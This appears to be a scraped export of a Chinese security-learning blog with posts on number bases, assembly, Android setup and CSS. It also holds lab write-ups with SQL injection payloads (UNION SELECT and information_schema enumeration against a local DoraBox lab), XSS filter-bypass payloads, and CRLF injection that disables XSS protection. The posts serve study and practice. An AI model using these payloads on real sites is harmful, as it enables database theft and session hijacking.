对数据宽度的理解和有无符号数4位宽度表示4位宽度表示：假设计算机只能存储4位2进制数： 0000 0001 0010 0011 0100 0101 0110 0111 1000 1001 1010 1011 1100 1101 1110 1111 0 1 2 3 4 5 6 7 8 9 A B C D E F -w303 存无符号数时：0 1 2 3 4 5 6 7 8 9 A B C D E F 存有符号数时： 正数：0 1 2 3 4 5 6 7 负数：-1 -2 -3 -4 -5 -6 -7 -8 其中对应关系： -1 -2 -3 -4 -5 -6 -7 -8 F E D C B A 9 8 无符号数时：从0到F逆时针依次增大。 有符号数时：含义从圆中间劈开，正数负数各一半，在F处为最大负数，0处为最小的正数。 为什么在存有符号数时说开头为1的数就是负数？我们只看二进制： | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 || — | — | — | — | — | — | — | — | — || 0000 | 0001 | 0010 | 0011 | 0100 | 0101 | 0110 | 0111 | -1 -2 -3 -4 -5 -6 -7 -8 1111 1110 1101 1100 1011 1010 1001 1000 很明显就可以看出，当二进制开头为1的时候对应存的数值就是负数了。 举例：对1011的理解 1011在我们当做是有符号时就是-5，无符号就是B。这个完全看我们如何去定义。 #### 8位宽度： 8位宽度表示：假设计算机只能存储8位2进制数。 -w315 无符号数：0 1 2 3 4 ……FF 有符号数：正数：0 1 2 3 4 5 6 7 …7F负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FF FE FD FC FB FA F9 F8 …. 80 16位宽度16位宽度表示：假设计算机只能存储16位2进制数 -w317 无符号数：0 1 2 3 4 ……FFFF 有符号数：正数：0 1 2 3 4 5 6 7 …7FFF负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FFFF FFFE FFFD FFFC FFFB FFFA FFF9 FFF8 …. 8000 32位宽度32位宽度表示：假设计算机只能存储32位2进制数 -w378 无符号数：0 1 2 3 4 ……FFFFFFFF 有符号数：正数：0 1 2 3 4 5 6 7 …7FFFFFFF负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FFFFFFFF FFFFFFFE FFFFFFFD FFFFFFFC FFFFFFFB FFFFFFFA FFFFFFF9 FFFFFFF8 …. 80000000 ### 几个本质问题 1：计算机除了0和1什么也不认识。 2：如果存的数据超过数据长度限制，超过的会直接抛弃。 3：有符号数和无符号数是我们自己用的时候定义的，定义是什么就是什么。 ### 几个重要的计量单位： BYTE 字节 8BIT WORD 字 16BIT 2字节 DWORD 双字 32BIT 4字节 逻辑运算二进制的逻辑运算：or：或(or |) 只要有一个为1就是1 -w915 and：与(and &amp;)两个都为1才是1 -w871 xor异或（xor) 不一样为1 -w928 ps：错位了。。。 not非(not !) 1是0 0是1 -w255 逻辑运算的具体应用：想获取某个值得第N位的值是1还是0如：8F 方法：想看下第四位是0还是1，就写个第四个位为1其他都为0的数，然后进行一个与运算，如果出来结果是1.那就证明第四位就是1。 最简单的加密算法：如：要加密的数据：2015密钥：54因为密钥是两位的，所以要对2015分为20和15。 -w279 进行一次xor运算，出来就是加密后的值：74 41当用他俩再进行一次xor运算： -w253 就又变成了2015。这就完成了加密解密。","categories":[],"tags":[]},{"title":"进制学习","slug":"进制学习","date":"2019-09-28T03:52:16.000Z","updated":"2019-10-17T16:01:09.000Z","comments":true,"path":"2019/09/28/进制学习/","link":"","permalink":"http://chumen77.xyz/2019/09/28/进制学习/","excerpt":"","text":"进制学习进制的定义十进制的定义:由十个符号组成，分别是0 1 2 3 4 5 6 7 8 9逢十进一。 九进制的定义:由九个符号组成，分别是0 1 2 3 4 5 6 7 8逢九进一。 十六进制的定义:由十六个符号组成，分别是0 1 2 3 4 5 6 7 8 9 A B C D E F 进制的本质例如十进制：0 1 2 3 4 5 6 7 8 9 其就是由10个符号组成。如果定义其为9 1 5 2 4 7 6 3 8 0,或者换成 -w315 ,如果用上面的符号进行加密与解密，让不懂进制本质的人解密有很大的阻碍。 二进制与十六进制的映射关系 -w911 这个需要背会。 练习正常认知的进制：二进制从0写到100 -w900 七进制编制7进制加法表，乘法表，并计算下面的结果：23456+54356=？5621-654=？234*65=？ -w608 7进制加法表： -w541 7进制乘法表： -w537 粗略计算过程： -w275 本质就是直接查表了。 十六进制：编制16进制加法表，乘法表，并计算下面的结果：2D4E6+CF3A6=？5FD1-E5A=？2CA*A5=？ -w1387 16进制加法： -w1337 16进制乘法表： -w1330 粗略计算过程： -w238 都是查表。 面向本质的非认知进制：一：9进制定义：由9个符号组成，分别是：2、9、1、7、6、5、4、8、3，逢9进1 计算：123 + 234 = ? 先画个进制表： -w489 然后计算： -w154 解题过程:1)最后一位3+4中的4是第6个数，所以3+4 可以看成从3向后数6个为95，取最后一个5且有一个进位2)最后第二位2+3中的2是第0个数，所以2+3相当3，有一个进位，需要再向后查一个是92，取最后一位2且进1位3)第一位1+2中的2是第0个数，所以1+2相当于1，有一个进位，要再向后查一个，再查一位是7，所以最后是725 二：10进制定义：由10个符号组成，分别是：!、@、$、%、^、&amp;、*、A、B、C，逢10进1 计算：@$$B + %AC&amp; = ? 先画个进制表： -w583 然后计算： -w185 解题过程：1)最后一位B+&amp;中的&amp;是第5个数，所以B+&amp;可以看成从B向后数5个为@%，取最后一个%且有一个进位2)最后第二位$+C中的C是第9个数，所以$+C相当从$开始查9个数，前面有一个进位，需要再向后查一个是@$，取最后一位$且进1位3)最后第三位$+A中的A是第7个数，所以$+A相当于从$开始往后查7个，有一个进位，要再向后查一个，再查一位是@!，所以最后是!且进一位4)第一位的@+%中的@是第一个数，所以@+%相当于从%在往后查一位，因为有个进位所以再往后查一位就是&amp;。所以答案就是&amp;!$%。 总结：经过这次对进制的学习和练习，对进制理解更加的深刻，它们只是一堆符号，在达到某个程度后会进位罢了。在复习到c后，有时间可以学习一下写个进制加密的程序。","categories":[],"tags":[]},{"title":"逆向学习-滴水公开课","slug":"逆向学习-滴水公开课","date":"2019-09-27T15:14:39.000Z","updated":"2019-10-17T15:45:30.000Z","comments":true,"path":"2019/09/27/逆向学习-滴水公开课/","link":"","permalink":"http://chumen77.xyz/2019/09/27/逆向学习-滴水公开课/","excerpt":"","text":"逆向学习-滴水公开课知识总结一、内存的读写寻址公式一: [立即数]读取内存的值: MOV EAX,DWORD PTR DS:[0x13FFC4] MOV EAX,DYVORD PTR DS:[0x13FFC8] 向内存中写入数据: MOV DWORD PTR DS:[0x13FFC4],eax MOV DWORD PTR DS:[0x13FFC8].ebx 获取内存编号: LEA EAX,DWORD PTR DS:[0X13FFC4] LEA EAX,DWORD PTR DS:[ESP+8] 寻址公式二: [reg] reg代表寄存器可以是8个通用寄存器中的任意一个读取内存的值:MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX] 向内存中写入数据:MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EDX] MOV EAX,DWORD PTR DS:[EDX] 寻址公式三: [reg+立即数]读取内存的值:MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX+4] 向内存中写入数据:MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX+0xC].0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EDX+4] MOV EAX,DWORD PTR DS:[EDX+4] 寻址公式四：[reg+reg*（1 or 2 or 4 or 8）]读取内存的值:MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4] 向内存中写入数据:MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EAX+ECX*4] 寻址公式五：[reg+reg*（1 or 2 or 4 or 8）+立即数]读取内存的值:MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4+4] 向内存中写入数据:MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4+4],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EAX+ECX*4+2] 二、堆栈变形的艺术:push eax代码相当于:lea esp,dword ptr ss:[esp-4] mov dword ptr ss:[esp],eax 或者 mov dword ptr ss:[esp-4],eax lea esp,dword ptr ss:[esp-4] 还有 sub esp,0x4 mov dword ptr ss:[esp],eax push esp代码相当于：mov dword ptr [esp-4],esp sub esp,0x4 还有： mov dword ptr [esp-4],esp lea esp,dword ptr [esp-4] pop eax 代码相当于：lea esp,dword ptr [esp+4] mov eax,dword ptr [esp-4] mov eax,dword ptr [esp] lea esp,dword ptr [esp+4] pop esp 代码相当于：add esp,0x4 mov esp,dword ptr[esp-4]或者 lea esp,dword ptr[esp+4] mov esp,dword ptr[esp-4] 两条简单指令stos ：将eax中的值放入edi所指地址的内存里。 rep ：是重复指令 ecx中放入重复的次数","categories":[],"tags":[]},{"title":"安卓程序分析环境搭建","slug":"安卓程序分析环境搭建","date":"2019-09-23T09:22:24.000Z","updated":"2019-10-17T15:45:31.000Z","comments":true,"path":"2019/09/23/安卓程序分析环境搭建/","link":"","permalink":"http://chumen77.xyz/2019/09/23/安卓程序分析环境搭建/","excerpt":"","text":"#安卓程序分析环境搭建 Mac下安卓SDK搭建：前提是已经安装了homebrew神器： 1：下载SDK12brew search android-sdkbrew cask install android-sdk 2：配置环境变量123vim .zshrcexport ANDROID_SDK_ROOT=&quot;/usr/local/share/android-sdk&quot;export PATH=&quot;$&#123;PATH&#125;:$&#123;ANDROID_SDK_ROOT&#125;/tools:$&#123;ANDROID_SDK_ROOT&#125;/platform-tools&quot; !wq退出以后，source ~/.zshrc 123pwd/usr/local/share/android-sdk/tools/bin./sdkmanager 然后会出现Warning: File /Users/gjy/.android/repositories.cfg could not be loaded.继续touch /Users/gjy/.android/repositories.cfg 3：检验是否搭建好在终端输入：android -w706 这就ok了。 安卓NDK搭建前提是已经安装了homebrew神器： 1：下载NDK：12brew search android-ndkbrew cask install android-ndk 2：配置环境变量：123vim .zshrcexport ANDROID_NDK_HOME=&quot;/usr/local/share/android-ndk&quot; //添加进去正常保存退出source .zshrc 3：检验：ndk-build -w751 已经成功了。","categories":[],"tags":[]},{"title":"SQL注入基础学习","slug":"SQL基础学习","date":"2019-09-01T11:17:25.000Z","updated":"2019-10-24T07:58:10.000Z","comments":true,"path":"2019/09/01/SQL基础学习/","link":"","permalink":"http://chumen77.xyz/2019/09/01/SQL基础学习/","excerpt":"","text":"SQL注入基础学习数据类型（数字型）检测是否sql语句是否执行使用and,or,xor,like测试 ** 1=1 ** 1=2其中**可以为and or xor like任意一个ps：基本语句，注意真假逻辑关系，灵活进行测试。 使用符号测试 单引号 减号 数据类型（字符型）检测是否sql语句是否执行此处跟数字型测试办法基本一样，还是使用and,or,xor,like、单引号测试。最近接触字符型的注入较少，补充一下原理： 我们先进行正常查询：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&amp;submit=submit当我们给接受处加&#39;：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39;&amp;submit=submit语句执行后，会产生报错： 然后我们想办法不让其报错，就是来省略后面那个php代码语句加的&#39;: 用#来注释，但需要进行url来转变一下为%23 用--+ --%20来注释然后就可以来用and or xor like来测试了，例如：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=1--+&amp;submit=submit http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=2--+&amp;submit=submit union知识小记union在集合两个select查询语句时，一定要注意两个查询出来的结果,列数（columns）要相等才会出来结果。例如： SELECT * from news union SELECT 1,2; 报错，换成SELECT * from news union SELECT 1,2,3; order by 知识小记order by是按照一定规则来进行排序的语句。我们为什么能够通过order by排序，来排出来列名有多少个呢？我们来测试一下： SELECT * from test ORDER BY 1;当我们在测试到SELECT * from test ORDER BY 5; 发现出了异常。我们换个3列的表： SELECT * from news ORDER BY 3;显示是正常的SELECT * from news ORDER BY 4;所以可以发现我们在order by后加数字可以来测出来一个表的列名个数。 显示联合查询出现的结果显示我们自定义查询的结果，该怎么实现呢。先在靶场测试：SELECT * FROM news WHERE id = 2 union select 1,2,3 from test 明显网页是不给显示的。相同语句在数据库： 不给显示是因为服务器端php代码进行了处理，只可以显示出一条结果。那如果把第一个查询结果给无法显示，是不是就可以显示我们联合查询的结果呢。先在数据库测试下SQL语句：SELECT * FROM news WHERE id = -1发现是不显示东西的。继续测试:SELECT * FROM news WHERE id = -1 union select 1,2,3 from test; 接着我们拿到靶场测试： 达到我们的目的了。看这个页面显示的效果2 3，反向思维考虑把2 3改成我们的列名是不是就可以出数据了，但是我们如何知道表里的列名呢？ exists（）函数小记exists()是验证某个语句是否存在结果，是个bool函数，存在显示1反之是0。SELECT * FROM news WHERE id=1 and exists(select * from test);在数据库进行测试: SELECT * FROM news WHERE id=1 and exists(select * from aa); 发现在用这个函数查不存在的表的时候语句是没法进行的，然后我们可以通过这个语句来推出表名和列名，不过十分麻烦，可以通过burpsuit来跑。还有意外收获，可以看出数据库的名字 pentest就是数据库的名字了。 数据类型（搜索型）%的作用%在mysql中表示通配符。在SQL语句中:******* like &#39;%a&#39;，就是搜索返回以字母a结尾的所有信息，同理a%``%a%,分别就是 搜索返回以字母a开头的所有信息和搜索返回包含字母a的所有信息。 如何注入咱们先看下php源代码:$sql_search = &quot;SELECT * FROM {$t_name} WHERE {$c_name} like &#39;%{$c_value}%&#39;&quot;; //search很明显提前闭合&#39;%跟省略后面的%&#39;就可以了，所以http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; --+&amp;submit=submit -w804 然后我们正常走步骤，利用order by来确定下多少列：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 3--+&amp;submit=submit继续http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 4--+&amp;submit=submit -w1022 可以确定是3列了。 然后开始确定表名，这次用刚刚学的exist()来测试，并且练习一下burp来跑表名和列名：先正常构造payload：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; and exists(select * from news)--+&amp;submit=submit -w843 确定news表名存在，然后开始用burp跑其他的： -w555 -w837 我们是跑表名，所以在news加上变量。这个步骤需要先点 -w371 然后 -w364 -w531 在“添加“按钮旁的位置开始填入测试的表名，这个我是手动填的，可以进行导入字典。 -w1260 -w778 然后我们开始看结果 -w666 Render下面显示正常就证明是存在的。 -w963 这个是不存在。最终用这个办法可以跑出表名test、account。同样办法跑列名： -w665 -w797 确定出news表中有id、title、content等列。 然后我们更新下语句来查表和列，exists()这个办法是有点老的比较笨。在MySQL&gt;5.1版本中， -w764 我们可以在information_schema发现这个我们的数据库和列名都可以直接看到，所以我们可以以下语句进行查询：第一步，我们先让其可以显示我们想查询的内容http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,2,3 from news--+&amp;submit=submit把标题下的2换成darabase()函数，来显示下数据库的名字。http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,database(),3 from news--+&amp;submit=submit -w982 然后我们就的得到了pentest，然后开始利用这个mysql&gt;5.1特性来构造语句：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit -w902 但是在这里面怎么显示其他的名字呢？ -w523 继续:http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39;--+&amp;submit=submit其中可以将!=换成&lt;&gt;是同样的效果。 -w916 继续在语句中加and和不等于前面查出的表的名字：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39; and table_name&lt;&gt;&#39;news&#39;--+&amp;submit=submit我们发现这样很繁琐，如何能够让一下子全部显示出来呢，用到了group_cancat()函数：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit 然后我们继续去查列名，然后转到infromation_schema的columns下，一直搜索account下滑发现，我们在这个列表下可以拿到更全的信息： -w1162 去对比下account表下的列名信息： -w189 是相对应的，所以我们可以更改下语句：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=&#39;pentest&#39;--+&amp;submit=submit -w1012 发现我们还可以拿到这个表名，对比数据库我们也可以按照表名出现的个数看出其表下有多少列。然后我们拿news测试下获取列名：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;pentest&#39; and table_name=&#39;news&#39;--+&amp;submit=submit -w1049","categories":[],"tags":[]},{"title":"XSS挑战之旅","slug":"XSS挑战之旅","date":"2019-08-20T12:29:45.000Z","updated":"2019-10-17T15:42:25.000Z","comments":true,"path":"2019/08/20/XSS挑战之旅/","link":"","permalink":"http://chumen77.xyz/2019/08/20/XSS挑战之旅/","excerpt":"","text":"XSS挑战之旅关卡第一关payload:&lt;script&gt;alert(1)&lt;/script&gt; 此题没有任何过滤，直接构造语句，在标签之间进行输出。 第二关 此题变成了&lt;input&gt;标签，看到此处后可以考虑，提前闭合掉这个标签，所以构造payload：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;， 或者也可以payload：&quot; onclick=alert(1)&gt;这个需要点击搜索后，再点击搜索框，属于借助js事件类型。 第三关 变成了单引号的input标签，先尝试闭合input标签这个思路。 发现没有过去，去看下网页代码。 发现其过滤了&lt; &gt;,这样只能通过js事件来构造弹窗。跟上题一样，不过此处是单引号，所以构造payload：&#39; onclick=&#39;alert(1)注意此处的alert(1)的前面还有个单引号，其效果就是value=&#39;&#39; onclick=&#39;alert(1)&#39; 第四关 查看网页源代码，还是跟上题差不多，不过是单引号换成了双引号。按照原来的思路，构造payload：&quot; onclick=&quot;alert(1) 第五关看网页源代码，跟上题一样，直接先测试上题的payload。 &lt;input name=keyword value=&quot;&quot; o_nclick=&quot;alert(1)&quot;&gt;再次查看，可以看出对on进行了过滤，在尝试双写、改变大小写无果后。换思路看看&lt; &gt;是否过滤，发现没有过滤。然后考虑先闭合input标签，然后构造个超链接，点击后调用js事件。payload=&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;然后点击就ok了。 第六关第六关直接测试上题的payload，无法通过，然后看网页源代码：&lt;input name=keyword value=&quot;&quot;&gt; &lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;&quot;&gt;发现href遭到了过滤，结果发现改变大小写可以绕过。payload：&quot;&gt; &lt;a hRef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt; 第七关还是先测试上题的payload，然后查看源代码，发现： href与script直接被替换成了空，然后考虑双写绕过，构造payload：&quot;&gt; &lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;1&lt;/a&gt; 第八关 发现有些不一样了，然后先点下”添加友情链接“按钮，去看下网页源代码。 会发现这个题是在这个地方来进行xss攻击。先构造payload：javascript:alert(1)，无法通过，然后查看源代码&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;可以发现其过滤了字符串script，因为此处为html标记语言，考虑把”r”转换为HTML实体来绕过。构造payload：javasc&amp;#114;ipt:alert(1) 第九关 这题还是跟上题一个类型，但是发现不管加入什么都显示这个。不如加入个正常合法链接试一试，http://www.baidu.com,发现显示正常了，经过测试后发现其在检测到http://后才会正常显示你的代码。所以构造payload：javasc&amp;#114;ipt:alert(1)//http://注意”//“这个是来注释后面的代码的。 第十关 进来以后发现无任何可输入的地方，然后就查看源代码 发现其type类型全是hidden，然后考虑是不是考察这个知识点，在查询后发现大多解决办法就是把hidden，改为text类型。因为在浏览器get到type=”***“，即可把原来的type给替换所以考虑构造payload：&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()然后会出现个输入框，点击后即可过关。此处需要注意的是查看源代码后发现有三个input标签，但实际测试只有最后一个name=&quot;t_sort&quot;才会出现文本框，所以构造了以最后一个标签为攻击点的payload。 第十一关至第十三关这几关都是http头注入需要抓包来完成，基本大差不差的。第十一关 Referer 第十二关 ua 第十三关 cookie 明显是cookie注入了 第十四至最后这几道题基本都是看着别人的博客才做的下来，并且做了感觉不是太明白原理，就先不总结了。以后学到更深的再进行总结。 绕过姿势小补充“()”被过滤用” ` “ 字符了来代替括号。 payload: alert`1` 小进阶 “ ` “ “()”同时被过滤可以使用 &lt;svg&gt; 标签，其有一个特性就是可以执行HTML实体代码。用法是&lt;svg&gt;&amp;#数字;所以构造payload:&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;","categories":[],"tags":[]},{"title":"XSS知识简单学习","slug":"xss学习","date":"2019-08-16T08:21:01.000Z","updated":"2019-08-20T12:40:31.000Z","comments":true,"path":"2019/08/16/xss学习/","link":"","permalink":"http://chumen77.xyz/2019/08/16/xss学习/","excerpt":"","text":"XSS知识简单学习一:Xss简介XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。 ##二：ajax简介ajax其实就是异步JavaScript和xml，其最大优势在于可以实现异步访问。为什么要用AJAX，首先它够隐秘，也就是所谓的“无刷新”，其次，它能更有效地迅速处理各种复杂多变的数据。其可以实现异步更新和跨域。 三：xss漏洞分类存储XSS存储XSS,会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。也就是提交JS攻击代码存储到数据库然后再输出。 用户输入的地方最容易滋生XSS，譬如留言、评论等表单，一个的留言本，因为没有对用户输入的变量作出合适的过滤，导致一个XSS的产生。留言率先传递给管理员，当作javascript劫持，我们就可以利用管理员的权限做任何事情。当内容通过审核，发布到网站，此时所有的web浏览用户都有可能受到XSS，我们能获得更多的会话劫持。 反射型XSS攻击反射型XSS攻击也是非持久型XSS攻击，其是一次性的，仅对当次的页面访问产生影响。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的，其是经过服务器的。 其需要黑客进行诱骗使用户访问这个带有xss攻击的链接后，便被JavaScript劫持，收到攻击。 Dom-xss通过URL传入参数所触发，其不与服务器进行通信，但是我们的js攻击代码可以被执行，这是需要分析页面源码然后进行利用，是存在客户端页面的脚本自身中。 四：X-XSS-Protection是浏览器对xxs防护的一个策略，这个可以通过抓包软件，修改头来进行绕过。筒単一句活:header(&quot;X-XSS-Protection: 0&quot;);告泝浏览器禁用XSS保枦 header(&quot;X-XSS-Protection: 1&quot;);告泝浏览器幵宕XSS保枦 五：CRLF响应头注入Location: http://****%0d%0aX-XSS-Protection: 0就是相当于Location: http://**** XSS-Protection: 0这就是一个注入，又添加了一个响应头。但是这种漏洞在php版本&gt;5.1时候是不行的，因为其不允许在HTTP头中出现两个属性。应用场景： php&lt;5.1 碰到了服务器开启xss拦截 六：修补xss漏洞（简单）过滤例如 &gt; &lt; Script等等字眼 转义利用php函数 htmlentities()把字符转换为HTML实体 七：闭合xss当你的js代码被浏览器直接显示出来后，考虑是否是其源码里对你的js代码做了textarea标签处理，然后就需要我们去闭合这个textarea标签，比较通用的就是&#39;&quot;&gt;&lt;/textarea&gt;+js代码 即可。","categories":[],"tags":[]},{"title":"简易解决python2.X与python3.x共存问题","slug":"简易解决python2.X与python3.x共存问题","date":"2019-04-02T15:05:47.000Z","updated":"2019-04-29T14:56:51.000Z","comments":true,"path":"2019/04/02/简易解决python2.X与python3.x共存问题/","link":"","permalink":"http://chumen77.xyz/2019/04/02/简易解决python2.X与python3.x共存问题/","excerpt":"","text":"简易解决python2.X与python3.x共存问题python3.x不兼容Python2.x，语法有许多不同，但很多工具还是需要2.x版本，自己又是初学者，只是跑跑别人的脚本，不会改语法冲突。。。。下面说解决办法。 安装模块Python目前还是需要分开安装 1py -2 -m pip install xxxx 1py -3 -m pip install xxxx 运行脚本分别用py2.x py3.x运行一个1.py的脚本： 1py -2 1.py 1py -3 1.py 或者在1.py的文件代码头加上#! python3 #! python2看个人的情况。 这样就直接输入： 1py 1.py 这只是解决了简单的安装模块和运行脚本的问题。","categories":[],"tags":[]},{"title":"css学习","slug":"css学习","date":"2019-03-30T14:48:12.000Z","updated":"2019-08-04T04:09:51.000Z","comments":true,"path":"2019/03/30/css学习/","link":"","permalink":"http://chumen77.xyz/2019/03/30/css学习/","excerpt":"","text":"CSS如何使用CSSCSS可以通过以下方式添加到HTML中: 内联样式- 在HTML元素中使用”style” 属性 (不推荐使用)； 内部样式表 -在HTML文档头部 &lt;head&gt; 区域使用&lt;style&gt;元素 来包含CSS。 外部引用 - 使用外部 CSS 文件(==推荐使用)== 内联样式应用到个别元素时，就可以使用内联样式。 1&lt;div style=\"color: red;width: 100px; height: 100px; background: yellow\"&gt;苹果&lt;/div&gt; 内部样式表当单个文件需要特别样式时，就可以使用内部样式表。你可以在&lt;head&gt; 部分通过 &lt;style&gt;标签定义内部样式表:。也推荐这样使用便于更改全局。 12345678910&lt;head&gt;&lt;style&gt; div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;/style&gt;&lt;/head&gt; 注：在头文件写的时候 style还是个开闭标签。 外部样式表用&lt;link&gt;当样式需要被应用到很多页面的时候，外部样式表将是理想的选择。 123&lt;head&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\"&gt; &lt;/head&gt; 其中“rel=”stylesheet” type=”text/css””这是固定的,”mystyle.css”这是css的地址； 练习：1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;css三种引入方式&lt;/title&gt; &lt;!-- &lt;style&gt; div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;/style&gt; --&gt; &lt;link rel=\"stylesheet\" href=\"1.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- &lt;div style=\"color: red;width: 100px; height: 100px; background: yellow\"&gt;苹果&lt;/div&gt; --&gt; &lt;div&gt; 苹果1&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 123456div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;!-- 1.css --&gt; 效果： CSS 语法 CSS 语法CSS 语法规则由两个主要的部分构成：选择器，以及一条或多条声明: 选择器通常是您需要改变样式的 HTML 元素。 每条声明由一个属性和一个值组成。 属性是您希望设置的样式属性。每个属性有一个值。属性和值被冒号分开。 CSS声明总是以分号(;)结束，声明组以大括号({})括起来 例：h1{ color:blue; font-size :12px;} 其中h1 为选择器 color 是属性 blue是值。 CSS 注释：CSS注释以 “/*“ 开始, 以 “*/“ 结束。 颜色：颜色属性被用来设置文字的颜色。 颜色是通过CSS最经常的指定： 十六进制值 - 如: ＃FF0000 一个RGB值 - 如: RGB(255,0,0) 颜色的名称 - 如: red 常用的：rgb：：r是红色，g是绿色，b是蓝色。 123body &#123;color:red;&#125; h1 &#123;color:#00ff00;&#125; /* 可以写成 #0f0 */h2 &#123;color:rgb(255,0,0);&#125; /* 0-255 */ 是其颜色深浅 ==注 - 所有浏览器都不支持颜色的rgb（）属性，因此建议不要使用它。== CSS选择器基本选择器： id 选择器：可以为标有特定 id 的 HTML 元素指定特定的样式。HTML元素以id属性来设置id选择器,CSS 中 id 选择器以 “#” 来定义。（==ID属性不要以数字开头==） class 选择器：class 选择器用于描述一组元素的样式，class 选择器有别于id选择器，class可以在多个元素中使用。 例：&lt;p class=&quot;txt txt2&quot;&gt;aaa&lt;/p&gt; 。class 选择器在HTML中以class属性表示, 在 CSS 中，类选择器以一个点“.”号显示 *通配符：全部标签属性的都会有效果。 标签 div：div标签 的会有效果。 练习： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;css选择器&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"1.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;div111 &lt;div&gt;div222&lt;/div&gt; &lt;p id=\"txt\"&gt;the way i am&lt;/p&gt; &lt;p class=\"txt1 txt2\"&gt;song&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; css： 123456789101112131415div&#123; color: red; width: 100px; height: 100px; background: yellow &#125;#txt&#123; color: #1f1;&#125;.txt1 &#123; font-size: 10px;&#125;.txt2 &#123; color: #ff2;&#125; 效果： CSS原理优先原则优先原则：后解析的内容，会覆盖掉原来解析的内容。 1:同一个选择器:从上往下执行。 例： 1234div&#123; color: red; color: green; &#125;/*最终是为绿色*/ 2:同一类型的选择器：从上往下执行 例： 123456div&#123; background: yellow;&#125;div&#123; background: red;&#125;/*最终是为红色*/ 123456.bg1&#123; background: yellow;&#125;.bg2&#123; background: blue;&#125;/*最终是为蓝色*/ &lt;div class=&quot;bg1 bg2&quot;&gt;hahaha&lt;/div&gt; 在HTML中，bg1 